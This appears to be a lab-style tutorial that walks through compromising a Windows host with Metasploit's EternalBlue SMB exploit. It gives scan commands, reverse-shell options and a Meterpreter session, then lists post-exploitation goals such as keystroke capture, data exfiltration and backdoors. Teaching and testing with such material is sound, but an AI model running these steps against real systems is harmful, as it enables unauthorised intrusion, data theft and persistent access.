Procedure

Step 1: Install Metasploit

To install Metasploit, update your package list and install Metasploit Framework using the following commands:

            sudo apt-get update
            sudo apt-get install metasploit-framework

Type the above command in the terminal to install Metasploit on your system.

Step 2: Start the Metasploit Console

Launch the Metasploit console by typing the following command:

            msfconsole

This opens the Metasploit interface where you can execute exploits and manage sessions.

Step 3: Scan the Target for Vulnerabilities

Before exploiting a system, gather information about the target. You can use Metasploit's built-in scanner modules or external tools like Nmap to identify vulnerabilities.

            use auxiliary/scanner/portscan/tcp
            set RHOSTS 
            set THREADS 10
            run

This command performs a TCP port scan on the target system.

Step 4: Search for Exploits

Search for exploits that match the vulnerabilities discovered in the previous step:

            search

For example, if the target has a vulnerable service like SMB, you can search for SMB exploits.

Step 5: Select an Exploit

Once you've found a suitable exploit, select it using the following command:

            use exploit/windows/smb/ms17_010_eternalblue

This example selects the EternalBlue exploit for SMB vulnerability (replace with the actual exploit for your target).

Step 6: Configure the Exploit

Set the necessary options for the exploit, such as the target IP address and payload. For example:

            set RHOST 
            set RPORT 445
            set LHOST 
            set LPORT 4444

This configures the target system (RHOST), the listening port (LPORT), and the local host (LHOST) for your reverse shell connection.

Step 7: Run the Exploit

Once configured, execute the exploit:

            exploit

If the exploit is successful, you will gain access to the target system, and a session will be established.

Step 8: Interact with the Target System

Once you have a session, you can interact with the target system using Meterpreter:

            sessions -i

This allows you to interact with the compromised system and execute further commands such as gathering system information, capturing keystrokes, or escalating privileges.

Step 9: Post-Exploitation

Once you've gained control of the system, perform post-exploitation tasks, such as:

  • Privilege Escalation: Attempt to gain higher privileges on the target system.
  • Data Exfiltration: Extract valuable data from the target system.
  • Persistence: Create backdoors for future access to the target system.

Step 10: Example Output

After executing the exploit, you may see output like:

            [*] Started reverse TCP handler on :4444 
            [*] Sending exploit payload to 
            [*] Meterpreter session 1 opened (:4444) at

Explanation:

  • Started reverse TCP handler: Indicates that a listener is waiting for a connection from the target.
  • Sending exploit payload: The exploit is being delivered to the target system.
  • Meterpreter session opened: A Meterpreter session has been established, providing full control over the target system.
